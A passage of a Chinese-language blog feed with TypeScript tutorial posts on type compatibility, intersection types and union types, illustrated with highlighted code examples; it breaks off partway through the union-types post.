        <content type="html"><![CDATA[<blockquote><p>为什么要兼容？</p><p>因为实际工作中，往往无法类型一致</p></blockquote><p>假设我们现在需要设计一个接受参数为 一个对象包涵3个属性 的函数，但实际数据缺拥有更多属性，我们很容易写出以下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span>, <span class="attr">d</span>: <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> newData = lodash.<span class="title function_">pick</span>(data, [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="title function_">fn</span>(newData) <span class="comment">// 假设 fn 函数 只需要 a, b, c</span></span><br></pre></td></tr></table></figure><p>但是实际上我们并不会这么写，对于 JS程序员来说为什么要这么麻烦呢，虽然你只需要三个属性，我多传你几个，你不用不就好了，所以一般我们都会着那么写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span>, <span class="attr">d</span>: <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fn</span>(data)  </span><br></pre></td></tr></table></figure><p>所以 TS 需要适应这种习惯，他不能去纠正别人，如果故意把别人的习惯打破，那就很难去做推广</p><blockquote><p>什么是类型兼容？</p><p>简单来说就是你就有的，我都有，则我们代替你，即：<br>y 有的，x都有，则 x 兼容 y</p></blockquote><h2 id="基本类型的兼容"><a href="#基本类型的兼容" class="headerlink" title="基本类型的兼容"></a>基本类型的兼容</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="built_in">string</span> | <span class="built_in">number</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: A = <span class="string">&#x27;hi&#x27;</span></span><br></pre></td></tr></table></figure><p>此时，字符串 ‘hi’范围更小缺兼容了范围更大的，，似乎有点违背上面的理论，此时我们用集合的方式来理解会更好</p><p><img src="/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%E5%85%BC%E5%AE%B9/index/img.png"></p><blockquote><p>结论：子集当然可以赋值给父集</p></blockquote><h2 id="普通对象的兼容"><a href="#普通对象的兼容" class="headerlink" title="普通对象的兼容"></a>普通对象的兼容</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;frank&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">  <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">email</span>: <span class="string">&#x27;qq.com&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="attr">p</span>: P = user</span><br></pre></td></tr></table></figure><p>如果用上面的结论，<code>子集 =&gt; 父集</code>，那么对于对象来说， Person 和 user 那个范围更小呢？</p><p>其实通过逻辑推断来说，user 是更小的，因为属性多就是限制条件多，满足条件的就少，其实还是满足上述结论的，</p><blockquote><p>但是为了方便记忆，我们可以得出对象的结论：属性多的可以赋值给属性少的</p></blockquote><h2 id="函数的兼容"><a href="#函数的兼容" class="headerlink" title="函数的兼容"></a>函数的兼容</h2><p>相比下来函数会更复杂一点，函数不仅有属性，还包括<strong>参数和返回值</strong></p><h3 id="参数个数"><a href="#参数个数" class="headerlink" title="参数个数"></a>参数个数</h3><p>直接上代码测试：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> 接受一个参数的函数 = <span class="function">(<span class="params">n :<span class="built_in">number</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(n)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> 接受两个参数的函数 = <span class="function">(<span class="params">n: <span class="built_in">number</span>, s: <span class="built_in">string</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(n, s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">接受一个参数的函数 = 接受两个参数的函数 <span class="comment">// <span class="doctag">TODO:</span> OK</span></span><br><span class="line">接受两个参数的函数 = 接受一个参数的函数 <span class="comment">// <span class="doctag">TODO:</span> 报错</span></span><br></pre></td></tr></table></figure><blockquote><p>很容易得出结论：参数少的兼容参数多的</p></blockquote><p>如果还没理解的话，可以结合实际来看，我们经常在函数传参的时候，只会少写参数个数，比如在 axios 的调用、事件的绑定等等</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const button = document.get<span class="constructor">ElementById(&#x27;<span class="params">submit</span>&#x27;)</span></span><br><span class="line">const fn =<span class="function"> (<span class="params">e</span>: M<span class="params">ouseEvent</span>) =&gt;</span> console.log(e)</span><br><span class="line"></span><br><span class="line">button.add<span class="constructor">EventListener(&#x27;<span class="params">click</span>&#x27;, <span class="params">fn</span>)</span></span><br><span class="line">button.add<span class="constructor">EventListener(&#x27;<span class="params">click</span>&#x27;, <span class="params">fn</span>, <span class="params">false</span>)</span> <span class="comment">// 相比上面，我们经常会少写参数</span></span><br><span class="line">button.add<span class="constructor">EventListener(&#x27;<span class="params">click</span>&#x27;, <span class="params">fn</span>, <span class="params">true</span>)</span></span><br></pre></td></tr></table></figure><p>在 JS 眼中，参数少传，问题不大，所以少写参数是很常见的</p><p>当然也许有杠精会说，我多传参数也问题不大啊。那么再想想看，实际你会去多传参数么？！基本不会吧~</p><h3 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h3><p>直接上代码测试：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">MyEvent</span> &#123;</span><br><span class="line">  <span class="attr">target</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">MyMouseEvent</span> <span class="keyword">extends</span> <span class="title class_">MyEvent</span> &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">y</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">listener</span> = (<span class="params">e: MyEvent</span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">target</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">listenerMouse</span> = (<span class="params">e: MyMouseEvent</span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">x</span>, e.<span class="property">y</span>)</span><br><span class="line"></span><br><span class="line">listenerMouse = listener <span class="comment">// <span class="doctag">TODO:</span> OK</span></span><br><span class="line">listener = listenerMouse <span class="comment">// <span class="doctag">TODO:</span> 报错</span></span><br></pre></td></tr></table></figure><blockquote><p>很容易得出结论：对参数要求少的兼容对参数要求多的，<strong>与普通对象的兼容相反</strong></p><p>因为相比普通对象来说，函数的参数是要求别人的，所以和普通对象相反也能理解</p></blockquote><p>我们再来看一个实际的栗子：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Event</span> &#123;</span><br><span class="line">  <span class="attr">target</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">MyMouseEvent</span> <span class="keyword">extends</span> <span class="title class_">Event</span> &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">y</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">listenEvent</span>(<span class="params">eventType: <span class="built_in">string</span>, handler: (n: Event) =&gt; <span class="built_in">void</span></span>) &#123; <span class="comment">// <span class="doctag">TODO:</span> 注意这里，只能写 Event，因为这里有可能会出现鼠标事件，所以只能只能写一个范围更大的类型</span></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们希望这么用</span></span><br><span class="line"><span class="title function_">listenEvent</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">e: MyMouseEvent</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">x</span>, x.<span class="property">y</span>)) <span class="comment">// <span class="doctag">TODO:</span> 报错</span></span><br><span class="line"><span class="comment">// 但只能这么用</span></span><br><span class="line"><span class="title function_">listenEvent</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">e: Event</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>((e <span class="keyword">as</span> <span class="title class_">MyMouseEvent</span>).<span class="property">x</span>, (e <span class="keyword">as</span> <span class="title class_">MyMouseEvent</span>).<span class="property">y</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还可以这么用</span></span><br><span class="line"><span class="title function_">listenEvent</span>(<span class="string">&#x27;click&#x27;</span>, (<span class="function">(<span class="params">e: MyMouseEvent</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">x</span>, x.<span class="property">y</span>)) <span class="keyword">as</span> (<span class="attr">e</span>: <span class="title class_">Event</span>) =&gt; <span class="built_in">void</span>)</span><br></pre></td></tr></table></figure><p>但是可以通过 TS 的配置让上面的代码正常运行</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tsconfig.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;strictFunctionTypes&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="特殊类型"><a href="#特殊类型" class="headerlink" title="特殊类型"></a>特殊类型</h2><blockquote><p>直接上<a href="https://www.typescriptlang.org/docs/handbook/type-compatibility.html#enums">文档</a></p></blockquote><p><img src="/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%E5%85%BC%E5%AE%B9/index/img_1.png"></p><h2 id="加餐"><a href="#加餐" class="headerlink" title="加餐"></a>加餐</h2><h3 id="顶类型和底类型"><a href="#顶类型和底类型" class="headerlink" title="顶类型和底类型"></a>顶类型和底类型</h3><p>这两个概念不是 TS 的内容，但却是类型系统的知识</p><p>先上理论：底部类型可以赋值给顶部类型，用一张图来表示：</p><p><img src="/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%E5%85%BC%E5%AE%B9/index/img_2.png"></p><h5 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h5><p>虽然推论了这么多，但是你其实都不用记忆，什么小的兼容大的，少的兼容多的…</p><p>因为实际一使用，TS 就会你报错提示你</p>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：交叉类型</title>
      <link href="/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E4%BA%A4%E5%8F%89%E7%B1%BB%E5%9E%8B/index/"/>
      <url>/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E4%BA%A4%E5%8F%89%E7%B1%BB%E5%9E%8B/index/</url>
      
        <content type="html"><![CDATA[<h2 id="交叉类型（Intersection-Types）-交集"><a href="#交叉类型（Intersection-Types）-交集" class="headerlink" title="交叉类型（Intersection Types）(交集)"></a>交叉类型（Intersection Types）(交集)</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="built_in">string</span> &amp; <span class="built_in">number</span></span><br></pre></td></tr></table></figure><p>很显然 A 的结果是 never，因为字符串和数字是两种完全不同的东西，所以一般交叉类型，<strong>我们不会用在普通类上</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> 有左手的人 = &#123;</span><br><span class="line">  <span class="attr">left</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> 有右手的人 = &#123;</span><br><span class="line">  <span class="attr">right</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> C = 有左手的人 | 有右手的人</span><br><span class="line"><span class="keyword">type</span> D = 有左手的人 &amp; 有右手的人</span><br></pre></td></tr></table></figure><p>以上的 C、D 类型用一张图表示：</p><p><img src="/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E4%BA%A4%E5%8F%89%E7%B1%BB%E5%9E%8B/index/img.png"></p><h3 id="思考”有左手的人”-可以有”右手”吗？"><a href="#思考”有左手的人”-可以有”右手”吗？" class="headerlink" title="思考”有左手的人” 可以有”右手”吗？"></a>思考”有左手的人” 可以有”右手”吗？</h3><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> 有左手的人 = &#123;</span><br><span class="line">  <span class="attr">left</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: 有左手的人 = &#123;</span><br><span class="line">  <span class="attr">left</span>: <span class="string">&#x27;左手&#x27;</span>,</span><br><span class="line">  <span class="attr">right</span>: <span class="string">&#x27;右手&#x27;</span>, <span class="comment">// <span class="doctag">TODO:</span> 这里会有报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然，这里的代码报错了，但是从逻辑上来讲，”有左手的人” 难道不能有”右手”吗？，再来看接下来的栗子：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> 有左手的人 = &#123;</span><br><span class="line">  <span class="attr">left</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> b = &#123;</span><br><span class="line">  <span class="attr">left</span>: <span class="string">&#x27;左手&#x27;</span>,</span><br><span class="line">  <span class="attr">right</span>: <span class="string">&#x27;右手&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: 有左手的人 = b</span><br></pre></td></tr></table></figure><p><strong>神奇的是</strong>，竟然不报错了，这就是 ts 很奇怪的地方，<strong>初始化的时候不能有多余的东西</strong></p><h3 id="接口也能交集"><a href="#接口也能交集" class="headerlink" title="接口也能交集"></a>接口也能交集</h3><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> 有左手的人 &#123;</span><br><span class="line">  <span class="attr">left</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> 有右手的人 &#123;</span><br><span class="line">  <span class="attr">right</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> 完整的手 = 有左手的人 &amp; 有右手的人</span><br></pre></td></tr></table></figure><h2 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h2><h3 id="普通对象"><a href="#普通对象" class="headerlink" title="普通对象"></a>普通对象</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Person = &#123;</span><br><span class="line">  name: <span class="keyword">string</span>;</span><br><span class="line">  age: <span class="keyword">number</span>;</span><br><span class="line">  id: <span class="keyword">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="keyword">User</span> <span class="title">= Person</span> &amp; &#123;</span><br><span class="line">  id : <span class="keyword">number</span>; // TODO: 注意：这里并没有报错</span><br><span class="line">  email: <span class="keyword">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const a: <span class="keyword">User</span> <span class="title">= &#123;</span></span><br><span class="line"><span class="title">  id</span>: <span class="number">1</span>, // TODO: 这里报错了，并且提示类型为 never，</span><br><span class="line">  name: &#x27;Jack&#x27;,</span><br><span class="line">  email: &#x27;qq.com&#x27;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是稍微改造一点，还有更特殊的情况</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">id</span>: <span class="string">&#x27;A&#x27;</span>; <span class="comment">// <span class="doctag">TODO:</span> 这里更具体了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">User</span> = <span class="title class_">Person</span> &amp; &#123;</span><br><span class="line">  id : <span class="string">&#x27;B&#x27;</span>; <span class="comment">// <span class="doctag">TODO:</span> 这里更具体了</span></span><br><span class="line">  <span class="attr">email</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: <span class="title class_">User</span> = &#123; <span class="comment">// <span class="doctag">TODO:</span> 这里直接提示 User 类型为 never，</span></span><br><span class="line">  <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Jack&#x27;</span>,</span><br><span class="line">  <span class="attr">email</span>: <span class="string">&#x27;qq.com&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就很难解释了，直接记住这种情况把~</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="function">(<span class="params">n: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> B = &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="function">(<span class="params">n: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">b</span>: B = &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="function"><span class="params">n</span> =&gt;</span> &#123; <span class="comment">// <span class="doctag">TODO:</span> 没有报错</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(n)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现当为函数的时候这里没有报错，且参数 n 的类型为 string | number，</p><p>一个接受参数类型为 number 的方法，一个接受参数类型为 string 的方法，这两个方法有没有交集呢？到目前来看已经很难想清楚了，明明是交集，怎么会得出并集！我们再来验证一下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="variable constant_">F1</span> = <span class="function">(<span class="params">n: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">F2</span> = <span class="function">(<span class="params">n: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">void</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> X = <span class="variable constant_">F1</span> &amp; <span class="variable constant_">F2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">x</span>: X = <span class="function">(<span class="params">n</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也没有报错，且参数 n 的类型为 string | number</p><p>也就是说，如果我们再在做两个对象交集的时候，遇到 key 的名字冲突的时候，那么他会对这个属性进行交集，且递归的交。</p><p>但是特殊在函数这里，<strong>函数的交集，会得到参数的并集</strong>，说实话我又不是很理解了，没办法按实践的结果来死记硬背把~</p>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：联合类型</title>
      <link href="/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E8%81%94%E5%90%88%E7%B1%BB%E5%9E%8B/index/"/>
      <url>/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E8%81%94%E5%90%88%E7%B1%BB%E5%9E%8B/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>JS 可以对值进行加减运算<br>如果把 TS 的类型系统的当作一门语言，<br>TS 可以对类型进行各种运算吗？<br>如果有，那么 TS 类型系统有那些运算呢？</p></blockquote><h2 id="联合类型（union-type）-也叫做并集"><a href="#联合类型（union-type）-也叫做并集" class="headerlink" title="联合类型（union type）(也叫做并集)"></a>联合类型（union type）(也叫做并集)</h2><h3 id="栗子🌰"><a href="#栗子🌰" class="headerlink" title="栗子🌰"></a>栗子🌰</h3><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="variable constant_">A1</span> = <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">B1</span> = <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">C1</span> = <span class="variable constant_">A1</span> | <span class="variable constant_">B1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="attr">c1</span>: <span class="variable constant_">C1</span> = <span class="number">42</span>;</span><br></pre></td></tr></table></figure><p>上述代码用图表示即为：</p><p><img src="/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E8%81%94%E5%90%88%E7%B1%BB%E5%9E%8B/index/img.png"></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="variable constant_">A2</span> = &#123; <span class="attr">name</span>: <span class="built_in">string</span> &#125;;</span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">B2</span> = &#123; <span class="attr">age</span>: <span class="built_in">number</span> &#125;;</span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">C2</span> = <span class="variable constant_">A2</span> | <span class="variable constant_">B2</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="attr">c2</span>: <span class="variable constant_">C2</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;John&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E8%81%94%E5%90%88%E7%B1%BB%E5%9E%8B/index/img_1.png"></p><h3 id="如何使用？"><a href="#如何使用？" class="headerlink" title="如何使用？"></a>如何使用？</h3><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">f1</span> = (<span class="params">a: <span class="built_in">number</span> | <span class="built_in">string</span></span>) =&gt; &#123;</span><br><span class="line">  a.<span class="property">xxx</span>?</span><br><span class="line">  <span class="comment">// 这里能使用出 a 的那些方法？</span></span><br><span class="line">  <span class="comment">// 即不能把 a 当作 number</span></span><br><span class="line">  <span class="comment">// 也不能把 a 当作 string</span></span><br><span class="line">  <span class="comment">// 那么，怎么使用 a 变量呢？</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想办法把类型取分开来即可：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">f1</span> = (<span class="params">a: <span class="built_in">number</span> | <span class="built_in">string</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> a === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">    a.<span class="title function_">toFixed</span>(<span class="number">2</span>) <span class="comment">// 这里可以调用 